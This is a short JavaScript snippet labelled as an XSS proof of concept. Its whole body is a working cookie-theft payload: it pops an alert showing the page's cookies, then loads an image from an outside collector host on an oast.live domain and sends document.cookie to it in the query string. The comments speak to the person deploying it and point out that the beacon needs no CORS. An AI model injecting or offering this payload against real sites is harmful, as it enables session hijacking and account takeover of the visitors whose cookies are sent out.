(() => {
  // Visible proof (you can remove this)
  alert("XSS PoC — cookies: " + document.cookie);

  // Beacon to your collector (works cross-origin, no CORS needed)
  const img = new Image();
  img.src = "https://d2s3r4mth8rhgt5fbi50garw8bcd5f1k6.oast.live/collect?c=" +
            encodeURIComponent(document.cookie || "");
})();
